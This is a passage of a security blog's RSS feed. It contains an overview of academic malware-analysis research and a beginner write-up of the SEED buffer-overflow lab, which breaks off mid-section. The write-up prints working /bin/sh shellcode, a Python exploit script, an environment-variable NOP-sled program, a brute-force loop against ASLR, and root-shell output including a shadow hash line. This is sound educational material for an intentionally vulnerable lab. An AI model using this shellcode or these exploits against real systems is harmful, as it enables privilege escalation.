+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?ssl=1"><img data-attachment-id="583" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/av2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=1417%2C2169&amp;ssl=1" data-orig-size="1417,2169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="av2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=196%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?fit=604%2C925&amp;ssl=1" class="alignnone size-full wp-image-583" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=604%2C925&#038;ssl=1" alt="av2" width="604" height="925" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1417&amp;ssl=1 1417w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=196%2C300&amp;ssl=1 196w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=768%2C1176&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?resize=669%2C1024&amp;ssl=1 669w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/av2.png?w=1208&amp;ssl=1 1208w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?ssl=1"><img data-attachment-id="584" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-12/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" data-orig-size="558,158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?fit=558%2C158&amp;ssl=1" class="alignnone size-full wp-image-584" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=558%2C158&#038;ssl=1" alt="Untitled" width="558" height="158" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?w=558&amp;ssl=1 558w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-11.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 558px) 100vw, 558px" data-recalc-dims="1" /></a></p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">557</post-id>	</item>
+		<item>
+		<title>Malware Analysis Overview for beginners</title>
+		<link>https://babyphd.net/2016/07/07/malware-analysis-overview-for-beginners/</link>
+				<pubDate>Thu, 07 Jul 2016 13:54:56 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[chuymich]]></category>
+		<category><![CDATA[re]]></category>
+		<category><![CDATA[research]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=545</guid>
+				<description><![CDATA[&#160; &#160; The malware threat landscape is continuously evolving. In this blog post, I would like to introduce the basic concept of malware and malware analysis, the ideas of both static and dynamic malware analysis. Besides, malware evasive techniques and novel solutions will be introduced as well as modern research such as automatic protocol RE and Android malware behavior &#8230; <a href="https://babyphd.net/2016/07/07/malware-analysis-overview-for-beginners/" class="more-link">Continue reading <span class="screen-reader-text">Malware Analysis Overview for beginners</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>The malware threat landscape is continuously evolving. In this blog post, I would like to introduce the basic concept of malware and malware analysis, the ideas of both static and dynamic malware analysis. Besides, malware evasive techniques and novel solutions will be introduced as well as modern research such as automatic protocol RE and Android malware behavior analysis will be mentioned in last sections.</p>
+<p><span id="more-545"></span></p>
+<h1><a id="post-545-_Toc444553187"></a>Basic principles of malware analysis</h1>
+<h2><a id="post-545-_Toc444553188"></a>What is malware?</h2>
+<p>Software that “deliberate fulfills the harmful intent of an attacker”. It motivates to create tools to detect and mitigate malicious software. There is a common signature-base AV scanners which match pre-generated signatures against files. But this approach is error-prone task and not be able to detect unknown, specially tailored malware.</p>
+<p><strong>Types of malware</strong>: Worm, virus, Trojan horse, spyware, bot(net), rootkit.</p>
+<p><strong>Infection vectors</strong>: Exploiting vulnerable services, drive-by download and SE.</p>
+<h2><a id="post-545-_Toc444553189"></a>Malware analysis:</h2>
+<p><strong>Static analysis</strong>: refers to techniques that verify the actions the program performs in practice, without actually executing it. Analysts often disassemble the program to understand their behaviors but it might result in ambiguous results if the binary uses self modifying code techniques (e.g., packer programs). Additionally, malware relying on outside values cannot be statically determined correctly (e.g., current system date, indirect jump instructions) Therefore, it is necessary to develop analysis techniques that are reliably analyze malicious software.</p>
+<p><strong>Dynamic analysis</strong>: refers to techniques that execute functions, verify the actions the program performs in practice by executing it. To monitor what functions are called is to intercept function calls (hooking). Then output the invocation to a log file or analyze input parameters or output results. There are 3 kinds of function calls: API, system calls and Windows Native API.</p>
+<p>Implementing function hooking: by inserting to source code (if exists), binary rewriting using Detours library, debugging techniques, replacing dynamic shared libraries.</p>
+<p>To analyze function parameter: Information flow tracking (taint sources and sinks), irect data dependencies (taint labels), address dependencies, control flow dependencies, implicit information flow.</p>
+<p>Implementation strategies for malware analysis:</p>
+<ul>
+<li>Analysis in User-/Kernel-mode: ease to invoke functions or API calls.</li>
+<li>Analysis in emulator: Memory&amp;CPU emulation (libemu, qemu etc.), full system emulation (Boshs, etc.)</li>
+<li>Analysis in Virtual Machine</li>
+<li>Network simulation: no internet but simulated network, or filtered network.</li>
+</ul>
+<h2><a id="post-545-_Toc444553190"></a>An example of static analysis - Metamorphic malware analysis and real-time detection</h2>
+<p>Metamorphism [4] is a technique that mutates the binary code using different obfuscations. It changes the opcodes with each run of the infected program and does not use any encryption or decryption (different from Polymorphism). The malware never keeps same sequence of codes in the memory.</p>
+<p>The authors present a new framework named Metamorphic Malware Analysis and Real-Time Detection (MARD). It builds a behavioral signature and detect metamorphic malware in real-time using two techniques: ACFG (Annotated Control Flow Graph) provides a faster matching of CFGs, without compromising detection accuracy and SWOD-CFWeight (Sliding Window of Difference and Control Flow Weight) mitigates and addresses key issues in current techniques, related to the change of the frequencies of opcodes, such as the use of different compilers, compiler optimizations, operating systems and obfuscations.</p>
+<p><img class="aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 1. <em>Overview of MARD</em></p>
+<h3><a id="post-545-_Toc444553191"></a>Metamorphic Malware Analysis and Real-Time Detection (MARD)</h3>
+<p>First, a training dataset Malware Templates is built using the malware training samples. After a sample is translated to Malware Analysis Intermediate Language (MAIL) and to a behavioral signature, the Similarity Detector detects the presence of malware in the program, using the Malware Templates. All the steps as shown are completely automated. The tool automatically generates the report after all the samples are processed.</p>
+<h3><a id="post-545-_Toc444553192"></a>Annotated Control Flow Graph detection technique</h3>
+<p>A sample is initially disassembled and translated to a MAIL program. The MAIL program is then annotated with patterns, then they build a CFG of the annotated MAIL program yielding the corresponding ACFG. The constructed ACFG becomes part of the signature of the program and is matched against a database of known malware samples to see if the program contains a malware or not. For detecting unknown malware, the authors build an ACFG for each function in the program is built. Then divide a program into smaller ACFGs, with one ACFG per function instead of building a large ACFG as signature. A sample which contains part of the control flow of a training malware sample, is classified as a malware, i.e. if a percentage (compared to some predefined threshold) of the number of ACFGs involved in a malware signature match with the signature of a sample then this sample is classified as a malware.</p>
+<h3><a id="post-545-_Toc444553193"></a>Sliding Window of Difference and Control Flow Weight detection technique</h3>
+<p>Shahid Alam et al propose a new opcode-based malware detection technique by transforming the assembly code to an intermediate language that makes the analysis independent of different compilers. Then they extract and analyze the control flow semantics of the program in order to mitigate the effect of obfuscations by polymorphic and metamorphic malware. The control flow semantics were applied by statistical analysis of opcode distributions to develop a set of heuristics.</p>
+<h3><a id="post-545-_Toc444553194"></a>Evaluation</h3>
+<p>Out of the 10 systems, ACFG clearly shows superior results and, unlike others is fully automatic, supports malware detection for 64 bit Windows (PE binaries) and Linux (ELF binaries) platforms and has the potential to be used as a realtime detector.</p>
+<p><img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-1.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p>Fig 2. <em>Comparison of ACFG with the metamorphic malware detection techniques based on control and information flow analysis.</em></p>
+<h2><a id="post-545-_Toc444553195"></a>Dynamic malware behavior analysis</h2>
+<p>The paper [3] implement an automated approach to extract malware behaviors by observing all the system functions calls in virtualized environment. A virtualized W32 machine is created through <em>wine</em> with common Windows system configuration and an emulated network infrastructure. Execution monitor, environment is controlled via <em>SSH</em>.</p>
+<h3><a id="post-545-_Toc444553196"></a>Analyzing malware behavior</h3>
+<p><strong>Malware behavior</strong>: The authors create a set of actions (virtual operating system function call) that a malware <em>M</em> can perform.</p>
+<p><strong>Determination of malware actions</strong>: There is an important issue that they must differentiate between function calls called by operating system and by malware. Gerard Wagener et. al create a set of return memory addresses to characterize correctly executed functions.</p>
+<p><strong>Malware behavior similarities</strong>: 2 malware behaviors are compared with each other and a similarity function is evaluated. This function compares pair-wise all the action and attaches scores for matching. A malware with low similarity can be seen as unknown behavior and vice versa.</p>
+<p><strong>Distance between malware behaviors</strong>: The previous comparison technique only consider the similarity of function call order. In some cases, the malfunctioned activities can run concurrently or depends on the operation scheduler. Then they improve the model by rely on the frequencies of function calls as well by using Hellinger distance. Besides, a malware did not call a function does not mean it never calls these functions. So they apply the technique of statistical smoothing then show how many information is contained in a malware behavior.</p>
+<p><strong>Phylogenetic tree for malware</strong>: A phylogenetic tree is a branching diagram or "tree" showing the relationships among various biological species based upon similarities and differences in their genetic characteristics. The authors apply a binary tree by grouping similar nodes based on the previous similarity matrix until the matrix is empty.</p>
+<h3><a id="post-545-_Toc444553197"></a>Experimental validation</h3>
+<ul>
+<li>Malwares are captured through a honeypot called Nepenthes.</li>
+<li>They created some anti-RE binaries to include as a behavior should be observed.</li>
+<li>They created obfuscated assembler code, used a debugger to see the code changes its behavior or not.</li>
+<li>They handled sleep(), exception division by zero (which is often used as an anti-sandbox), observed virtual operating system environment.</li>
+</ul>
+<p>Using above sequences to compute the similarity, they generated a top 10 list of most common malware behavior, average similarity etc. and used AV software to explain the similarity. Then they applied phylogenetic tree to highlight 3 malware families then built 2 trees based on similarity matrix and Hellinger distance matrix.</p>
+<p>The authors introduced the automated malware behavior analysis, then they can detect 0day malware based on low average distance similarity from real world data. It is considered that malwares behave similarly at the beginning, it means the malware author copied parts from previous malware. They plan to extend the work with better heuristics and a differentiated analysis.</p>
+<h1><a id="post-545-_Toc444553198"></a>The malware analysis arms race and its consequences</h1>
+<h2><a id="post-545-_Toc444553199"></a>Malware evasive techniques</h2>
+<p><strong>Self-modifying code and packers [1]</strong>: The malware self modifies its binary and store data in memory using encoding or encryption techniques. It also can be polymorphic using different encryption keys. Countermeasures are RE the unpacking algorithm, generic detection and reconstruction of packed code (catching the original binary in process address space).</p>
+<p><strong>Detection of Analysis environment</strong>: Malware tries to detect analysis platforms based on: Hardware fingerprint, execution environment (eg. IsDebuggerPresent()), external applications (such as debuggers), behavioral. Mitigations are eliminating the differences between analysis environment and real environment or modifying the malware during execution to force the wanted path to be executed.</p>
+<p><strong>Logic bombs</strong>: A malware might only execute on a certain date or reliance on user input.</p>
+<p><strong>Analysis performance</strong>: The execution of malware analysis might slow down the timing in the operating system which executes malware. Countermeasures: RDTSC time-stam counter register, slowing down time in an emulated/virtual environment; terminate the analysis once a given timeout process.</p>
+<h2><a id="post-545-_Toc444553200"></a>Malware analysis tools</h2>
+<p>In order to deal with thousands of malwares with modern techniques, security analysts create many novel tools to ease these challenges.</p>
+<ul>
+<li>Anubis: analysis of unknown libraries based on TTAnalyze, executes the sample in a Windows OS, focus on the executed operations on behalf of the sample, and produce a report (now support Android APK as well).</li>
+<li>Multiple path exploration: This tool recognizes a branching point whenever a control flow decision is based on data outside the monitored process. Then it is detected if a control flow decision is based on a return value of a system call (e.g., the current system time). Multiple path exploration is a countermeasure of logic bombs.</li>
+<li>CWSandbox: a virtual environment based on invoking API functions by injecting DLL to the running process. Then it analyze malware behavior and produce a malware analysis report.</li>
+<li>Norman Sandbox: also used in [3] to reference to anti-emulation code. The Norman Sandbox provides a simulated environment with fake impression that it is running on a real system to the sample under analysis that consists of custom-made versions of user-land APIs necessary for the sample to execute.</li>
+</ul>
+<h2><a id="post-545-_Toc444553201"></a>Bare-metal Analysis-based Evasive Malware Detection</h2>
+<p>Nowadays, malwares become more and more sophisticated especially improved techniques to identify analysis environment and refraining from performing malicious actions. In this section, I introduce the research of BareCloud [5] - an automated evasive malware detection system based on bare-metal dynamic malware analysis. This is a novel approach of hierarchical similarity-based malware behavior comparison to analyze the behavior of a sample in the various analysis systems.</p>
+<h3><a id="post-545-_Toc444553202"></a>Bare-metal system overview</h3>
+<p>The bare-metal malware analysis system is a cluster of hardware-based modular worker units based on a remote storage disk. The bare-metal system also has a software-based remote control mechanism to automate the malware execution process on the workers. This mechanism is based on the IPMI remote administration features,iSCSI protocol (Internet Small Computer System Interface) to attach remote disks to worker units, Logical Volume Manager (LVM)-based copy-on-write snapshots to host the remote disk used by the analysis system running on the worker units. After the completion of each malware analysis, the corresponding volume snapshot is recreated from a clean volume.</p>
+<p>The bare-metal malware analysis system is a real hardware-based hence there is really difficult for malware to identify the analysis environment. With these network log and disk capture, the authors make a behavior comparison after applying behavior deviation, behavioral profile, behavior extraction and hierarchical similarity.</p>
+<h3><a id="post-545-_Toc444553203"></a>Evaluation</h3>
+<p>The experiments show that research produces better evasion detection results compared to previous methods. BareCloud was able to automatically detect 5,835 evasive malware out of 110,005 recent samples.</p>
+<h1><a id="post-545-_Toc444553204"></a>Automatic protocol RE</h1>
+<p>Previous sections focus on techniques to analyze and classify malware based on hooking functions, system calls. However, understanding the C&amp;C botnet’s protocol is a hard work and analysts need to rewrite every sent and received messages. In the next section, I will introduce Dispatcher [2] – an automatic protocol RE to analyze botnet networking communication.</p>
+<h2><a id="post-545-_Toc444553205"></a>Dispatcher implementation overview</h2>
+<p>The captured output buffer (in case of encrypted protocols, they capture the buffer before being encrypted and sent or they capture the buffer after being decrypted and received, therefore they can obtain unencrypted data) will be <em>deconstructed</em> to build message field tree.</p>
+<p><img class="aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-2.png?w=604&#038;ssl=1" data-recalc-dims="1" /> <img class="aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-3.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 3. <em>Message field tree and Field semantics identified by Dispatcher</em></p>
+<p>To infer the field semantics, Juan Caballera et al. use type-inference-based technique that leverage the observation that many functions and instructions are used by known programs contain semantic information. Such interference is general and can be used to identify large scale of field semantics such as cookie, timestamps, hostname, port, IP address etc.</p>
+<p>Combining 2 above solutions, the authors introduced Dispatcher which firstly makes a forward pass over the execution trace collecting information needed using loop analysis, callstack analysis and buffer liveness analysis. Then it use a recursive process to deconstruct the buffer based on program locations, dependency chains (a sequence of write operations). Dispatcher infer the field attributes eventually by determine: keywords, length fields, delimiters, variable-length fields and arrays.</p>
+<h2><a id="post-545-_Toc444553206"></a>Evaluation</h2>
+<p>The authors evaluate these techniques on MegaD C&amp;C which uses a proprietary encryption protocol on port 443 (instead of SSL) and they successfully rewrite and summarize its field semantics and compare this with unencrypted messages using BinPac. Besides, they evaluate their techniques on 4 open protocols: HTTP, DNS, FTP and ICQ. The results show that the accuracy of the message format automatically extracted by Dispatcher can rival that of Wireshark, without requiring a manually generated grammar.</p>
+<h1><a id="post-545-_Toc444553207"></a>Automatically Reconstruct Android Malware Behaviors</h1>
+<p>With a huge user base of Anroid mobile devices, Android malwares are rising with an alarmingly pace. This section I will summarize basic concepts of CopperDroid [6], an approach built on top of QEMU to automatically perform out-of-the-box dynamic behavioral analysis of Android malware.</p>
+<h2><a id="post-545-_Toc444553208"></a>CooperDroid</h2>
+<p><img class="aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/07/word-image-4.png?w=604&#038;ssl=1" data-recalc-dims="1" /></p>
+<p style="text-align: center;">Fig 4. <em>CooperDroid Architecture</em></p>
+<p>The whole Android system runs on top of the CopperDroid emulator based on qemu (a generic and open source machine emulator and virtualizer). It enhances the Android emulator to enable system call tracking and support our out-of-the-box system call-centric analyses. The communication between host and emulator is using GDB support.</p>
+<ul>
+<li>Tracking System Call Invocations: This is the basic dynamic malware analysis technique mentioned in 2.4. However, the ARM architecture underlying the Android operating system and CopperDroid <strong>swi </strong>instruction for invoking system calls which are different from Windows/Linux OS.</li>
+<li>Binder Analysis: Dissecting interprocess communication (IPC) and remote procedure calls (RPCs). Android uses Binder which allows a Java process to invoke methods of remote objects as if they were local methods, through synchronous calls. CopperDroid carry out a detailed analysis of communication channels to specify behaviours of malicious Android applications. For example, when sending a SMS message, the system invokes service <em>isms</em> and remotely invoking its <em>sendText</em> function with the proper arguments. CopperDroid catches the arguments of each binder-related ioctl system call to reconstruct the remote invocation.</li>
+<li>Path Coverage: Unanalysed path is exacerbated when mobile applications are user driven and interaction with applications. To address this problem, CopperDroid implements an approach based on extracting information from the Manifest to stimulate the analyzed sample with a number of events of interest. For example, injecting events such as phone calls and reception of SMS texts would lead to the execution of the registered application's broadcast receivers.</li>
+</ul>
+<h2><a id="post-545-_Toc444553209"></a>Results</h2>
+<p>The authors observed an average of 28% additional behaviors on more than 60% of the Android Malware Genome Project's samples, and an average of 22% additional behaviors on roughly 73% of the Contagio's samples.</p>
+<h1><a id="post-545-_Toc444553210"></a>References</h1>
+<p>[1] Egele, Manuel, et al. "A survey on automated dynamic malware-analysis techniques and tools." ACM Computing Surveys (CSUR) 44.2 (2012): 6.</p>
+<p>[2] Caballero, Juan, et al. "Dispatcher: Enabling active botnet infiltration using automatic protocol reverse-engineering." Proceedings of the 16th ACM conference on Computer and communications security. ACM, 2009.</p>
+<p>[3] Wagener, Gérard, Radu State, and Alexandre Dulaunoy. "Malware behaviour analysis." Journal in Computer Virology 4.4 (2008): 279-287.</p>
+<p>[4] Shahid Alam, R.Nigel Horspool, Issa Traore, Ibrahim Sogukpinar. “A framework for metamorphic malware analysis and real-time detection”. Computers &amp; security 48 (2015) 212-233</p>
+<p>[5] Dhilung Kirat, Giovanni Vigna, and Christopher Kruegel. “BareCloud: Bare-metal Analysis-based Evasive Malware Detection”. Proceedings of the 23rd USENIX Security Symposium. ISBN 978-1-931971-15-7</p>
+<p>[6] Alessandro Reina, Aristide Fattori, Lorenzo Cavallaro. “A System Call-Centric Analysis and Stimulation Technique to Automatically Reconstruct Android Malware Behaviors”. In the Proceedings of the 6th European Workshop on Systems Security (EuroSec).</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">545</post-id>	</item>
+		<item>
+		<title>Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</title>
+		<link>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/</link>
+				<comments>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/#comments</comments>
+				<pubDate>Sat, 12 Mar 2016 16:02:46 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=486</guid>
+				<description><![CDATA[Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if you are experienced in CTF's pwn then just skip it. Enjoy! Reference: BoF Vulnerability Lab (Syracuse University) Return to Shellcode =================== &#8230; <a href="https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/" class="more-link">Continue reading <span class="screen-reader-text">Writeup for beginners - BoF Vulnerability Lab (Syracuse University)</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Visitors sometimes feel bored with our web blog because of too many boring stuffs which not often appear in their casual work/study. I just want to post such a simple tutorial for beginners and if you are experienced in CTF's pwn then just skip it. Enjoy!</p>
+<p><span id="more-486"></span></p>
+<p>Reference: <a href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Buffer_Overflow/" target="_blank">BoF Vulnerability Lab (Syracuse University)</a></p>
+<p><strong>Return to Shellcode</strong><br />
+===================</p>
+<p>The program stack.c has 2 functions: main() and bof() which has a buffer overflow vulnerability. Main function reads an input from a file called “badfile”, and then passes this value to function bof(). The original input can have a maximum length of 517 bytes, but the buffer in bof() has only 24 bytes long. Buffer overflow will occur because strcpy() does not check boundaries. Since this program is super-uid executable, if a normal user can exploit this buffer overflow vulnerability, any user might be able to execute shellcode under root privilege. It should be considered that the program gets its input from a file called ’badfile’, system environment variables and argument variables. They are under our control hence there are many approaches to spawn a root shell.<br />
+Some conditions in the first task are described as following:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under<br />
+root permission.</p>
+<p>- It was built with options: execstack and -fno-stack-protector to<br />
+turn off the non-executable stack and StackGuard protections.</p>
+<p>- ASLR was turned off.</p>
+<p>Inside the function bof(), the buffer variable is defined as an array of 24 chars. It can be easily overflowed with a longer string str which reads from “badfile”. However, the defined variable on stack depends along both operating system and the compiler. Result of GDB will help us to make sure the size of stack certainly:<br />
+(gdb) disas bof<br />
+Dump of assembler code for function bof:</p>
+<pre class="lang:default decode:true ">0x08048484 &lt;+0&gt;: push ebp
+0x08048485 &lt;+1&gt;: mov ebp,esp
+0x08048487 &lt;+3&gt;: sub esp,0x38
+0x0804848a &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
+0x0804848d &lt;+9&gt;: mov DWORD PTR [esp+0x4],eax
+0x08048491 &lt;+13&gt;: lea eax,[ebp-0x20]
+0x08048494 &lt;+16&gt;: mov DWORD PTR [esp],eax
+0x08048497 &lt;+19&gt;: call 0x8048380 &lt;strcpy@plt&gt;
+0x0804849c &lt;+24&gt;: mov eax,0x1
+0x080484a1 &lt;+29&gt;: leave
+0x080484a2 &lt;+30&gt;: ret</pre>
+<p>&nbsp;</p>
+<p>The buffer variable’s size is 32 bytes according to line 13 and also 32 bytes to reach Stack pointer and plus 4 bytes to reach saved Based pointer. In order to spawn a shell, execve /bin/sh shellcode was generated and placed into badfile after some NOPs (\\x90) . The return address is unknown and also it is a difference between GDB environment and the real-time one. It can be revealed by using:</p>
+<p>- Live program tracing (strace/ltrace).</p>
+<p>- Modifying the source code.</p>
+<p>- Brute-forcing the return address.</p>
+<p>- GDB debugging with dumped core (segmentation fault).</p>
+<p>We chose the first solution because the second one is unrealistic, the third and fourth one would take much effort.</p>
+<pre class="lang:default decode:true">seed@ubuntu:~/Desktop$ ltrace ./stack
+__libc_start_main(0x80484a3, 1, 0xbffff434, 0x8048520, 0x8048590 &lt;unfinished ...&gt;
+fopen("badfile", "r") = 0x804b008
+fread(0xbffff187, 1, 517, 0x804b008) = 40
+----snippet----</pre>
+<p>The buffer variable which reads from badfile has address: 0xbffff187. In sum, we construct a payload combined from NOPs, shellcode, ESP (or a random 4bytes), return address 0xbffff187 in little-endian format to an exploitation program called exploit.py which writes the payload to “badfile”:</p>
+<p>&nbsp;</p>
+<pre class="lang:default decode:true ">import struct
+shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+f = open('badfile','w')
+ret = struct.pack('&lt;I', 0xbffff187)
+f.write("\x90"*(0x20-len(shellcode))+shellcode+"DEAD"+ret)</pre>
+<p>&nbsp;</p>
+<p>We launch the attack by running the vulnerable program and spawn a root shell successfully.</p>
+<pre class="lang:default decode:true ">[12/01/2015 15:25] seed@ubuntu:~/Desktop$ python exploit.py
+[12/01/2015 15:25] seed@ubuntu:~/Desktop$ ./stack
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)
+# cat /etc/shadow
+root:$6$012BPz.K$fbPkT6H6Db4/B8cLWbQI1cFjn0R25yqtqrSrFeWfCgybQWWnwR4ks/.rjqyM7Xwh/pDyc5U1BWOzkWh7T9ZGu.:15933:0:99999:7:::</pre>
+<p>&nbsp;</p>
+<p><strong>Address Randomization</strong><br />
+=====================</p>
+<p>There are some conditions in the second task as following:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
+<p>- It was built with options: execstack and -fno-stack-protector to turn off the non-executable stack and StackGuard protections.</p>
+<p>- ASLR was turned on.</p>
+<p>The above exploitation program was not working and resulted “Segmentation fault (core dumped)” because ASLR was turned on that<br />
+assures the program addresses are changed randomly for each execution. There are some techniques to bypass this prevention:</p>
+<p>- Brute-forcing or running the exploitation program many times</p>
+<p>- Return-oriented programming (or using a branch of this technique: ret2libc)</p>
+<p>However the “badfile” input can have a maximum length of only 517 bytes but the observed buffer could be any addresses ranged from 0xbf000000 to 0xbfffffff. It makes the attack difficult to jump into the shellcode exactly even when we fill the whole “str” variable upto 517 bytes with a larger number of NOPs and shellcode placed behind the return address. In order to increase the probability of success, we can utilize an environment variable to hold a larger payload. The following code loads ten thousand bytes of NOPs and shellcode into environment variable EGG.</p>
+<pre class="lang:default decode:true ">/* eggcode.c */
+#include &lt;unistd.h&gt;
+#define NOP 0x90
+char shellcode[] =
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
+int main(void)
+{
+char shell[10000];
+puts("Eggshell loaded into environment.\n");
+memset(shell,NOP,10000); /* fill-up the buffer with NOP */
+/* fill-up the shellcode on the second half to the end of buffer */
+memcpy(&amp;shell[10000-strlen(shellcode)],shellcode,strlen(shellcode));
+/* set the environment variable to */
+/* EGG and shell as its value, rewrite if needed */
+setenv("EGG", shell, 1);
+/* modify the variable */
+putenv(shell);
+/* invoke the bash */
+system("bash");
+return 0;
+}</pre>
+<p>&nbsp;</p>
+<p>We simply executed the program above then attempted ./stack in the following loop and spawn a root shell in just a minute.</p>
+<pre class="lang:default decode:true ">$ sh -c "while [ 1 ]; do ./stack; done;"
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+---snippet---
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),130(wireshark),1000(seed)</pre>
+<p>&nbsp;</p>
+<p>Stack Guard<br />
+<strong>===========</strong></p>
+<p>The following options describe the conditions of third task:</p>
+<p>- The vulnerable program was compiled with chmod 4755 under root permission.</p>
+<p>- It was built without the option -fno-stack-protector to turn on the Stack Guard.</p>
+<p>- ASLR was turned off.</p>
+<p>For this task, we executed the exploitation program again and observed an error message:</p>
+<pre class="lang:default decode:true ">seed@ubuntu:~/Desktop$ ./stack
+*** stack smashing detected ***: ./stack terminated
+Segmentation fault (core dumped)</pre>
+<p>&nbsp;</p>
+<p>The reason of this error is a protection mechanism used by compiler to detect buffer overflow occurs. It adds random protection variables (called canaries or stack cookies) to the stack. We can get some information about the point of overflow insight by running the program in GDB. For instance, the disassembly of bof() function is different from the previous one:</p>
+<pre class="lang:default decode:true ">(gdb) disas bof
+Dump of assembler code for function bof:
+0x080484d4 &lt;+0&gt;: push ebp
+0x080484d5 &lt;+1&gt;: mov ebp,esp
+0x080484d7 &lt;+3&gt;: sub esp,0x48
+0x080484da &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]
+0x080484dd &lt;+9&gt;: mov DWORD PTR [ebp-0x2c],eax
+0x080484e0 &lt;+12&gt;: mov eax,gs:0x14
+0x080484e6 &lt;+18&gt;: mov DWORD PTR [ebp-0xc],eax
+0x080484e9 &lt;+21&gt;: xor eax,eax
+0x080484eb &lt;+23&gt;: mov eax,DWORD PTR [ebp-0x2c]
+0x080484ee &lt;+26&gt;: mov DWORD PTR [esp+0x4],eax
+0x080484f2 &lt;+30&gt;: lea eax,[ebp-0x24]
+0x080484f5 &lt;+33&gt;: mov DWORD PTR [esp],eax
